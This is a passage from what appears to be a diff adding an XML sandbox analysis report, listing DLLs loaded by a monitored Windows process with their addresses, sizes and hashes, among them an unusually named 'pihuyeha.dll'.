+<load_dll filename="C:\WINDOWS\system32\RPCRT4.dll" successful="1" address="&#x24;77E50000" end_address="&#x24;77EE2000" size="598016" filename_hash="f3bb6474ec18ee9cccc02ef44510a78b42058a41"/>
+<load_dll filename="C:\WINDOWS\system32\Secur32.dll" successful="1" address="&#x24;77FC0000" end_address="&#x24;77FD1000" size="69632" filename_hash="31166d1e35a911a082149f5efac2dac228109615"/>
+<load_dll filename="C:\WINDOWS\system32\GDI32.dll" successful="1" address="&#x24;77EF0000" end_address="&#x24;77F39000" size="299008" filename_hash="0f37018f672c7635691f7317ade3c5a63904ec96"/>
+<load_dll filename="C:\WINDOWS\system32\USER32.dll" successful="1" address="&#x24;7E360000" end_address="&#x24;7E3F1000" size="593920" filename_hash="08fe9ff1fe9b8fd237adedb10d65fb0447b91fe5"/>
+<load_dll filename="C:\WINDOWS\system32\msvcrt.dll" successful="1" address="&#x24;77BE0000" end_address="&#x24;77C38000" size="360448" filename_hash="70d5f97088cc9348bb9d10098af0738a696b96de"/>
+<load_dll filename="C:\WINDOWS\system32\SHLWAPI.dll" successful="1" address="&#x24;77F40000" end_address="&#x24;77FB6000" size="483328" filename_hash="a9245beec2e139b31cd3b65e0f0e4804c030e639"/>
+<load_dll filename="C:\WINDOWS\system32\SHELL32.dll" successful="1" address="&#x24;7E670000" end_address="&#x24;7EE91000" size="8523776" filename_hash="bbe9d57955e5d348e664b72faf331a7b9d722d0c"/>
+<load_dll filename="C:\WINDOWS\system32\ole32.dll" successful="1" address="&#x24;774B0000" end_address="&#x24;775ED000" size="1298432" filename_hash="c7753525d5276ab92a01a8a3c39cfb5269da7f98"/>
+<load_dll filename="C:\WINDOWS\system32\urlmon.dll" successful="1" address="&#x24;452E0000" end_address="&#x24;45407000" size="1208320" filename_hash="d1fe6e0c349d546f931a4654415e648f30ed91cb"/>
+<load_dll filename="C:\WINDOWS\system32\OLEAUT32.dll" successful="1" address="&#x24;770F0000" end_address="&#x24;7717B000" size="569344" filename_hash="3168a173d177f470928b468db777640861dcb32e"/>
+<load_dll filename="C:\WINDOWS\system32\iertutil.dll" successful="1" address="&#x24;43F60000" end_address="&#x24;43FA5000" size="282624" filename_hash="962fdf7a8839794fdb71eb6d15ae0824a89db8d7"/>
+<load_dll filename="C:\WINDOWS\system32\VERSION.dll" successful="1" address="&#x24;77BD0000" end_address="&#x24;77BD8000" size="32768" filename_hash="adf263b658136ccb3cde72d0e6dd634c5a5e5143"/>
+<load_dll filename="C:\WINDOWS\system32\IMM32.DLL" successful="1" address="&#x24;76330000" end_address="&#x24;7634D000" size="118784" filename_hash="f9be7678080084bc3cb48d0cb64bba9ba98800f1"/>
+<load_dll filename="C:\WINDOWS\system32\pihuyeha.dll" successful="1" address="&#x24;10000000" end_address="&#x24;1001D356" size="119638" filename_hash="hash_error"/>
+<load_dll filename="C:\WINDOWS\WinSxS\x86_Microsoft.Windows.Common-Controls_6595b64144ccf1df_6.0.2600.5512_x-ww_35d4ce83\" successful="1" address="&#x24;773A0000" end_address="&#x24;774A3000" size="1060864" filename_hash="hash_error"/>
+<load_dll filename="C:\WINDOWS\system32\comctl32.dll" successful="1" address="&#x24;5D450000" end_address="&#x24;5D4EA000" size="630784" filename_hash="ba126572bcb4ac594a3c37e2ac86db40b173878d"/>
+<load_dll filename="C:\WINDOWS\system32\pstorec.dll" successful="1" address="&#x24;5E490000" end_address="&#x24;5E49D000" size="53248" filename_hash="8ae378a352c4a13516bf1fe5a8615d8893d2ff2d"/>
+<load_dll filename="C:\WINDOWS\system32\ATL.DLL" successful="1" address="&#x24;76AD0000" end_address="&#x24;76AE1000" size="69632" filename_hash="59cb82f432d529da3e81b030b2365c22a95fd35a"/>
+</all_section>
+</thread>
+</process>
+</processes>
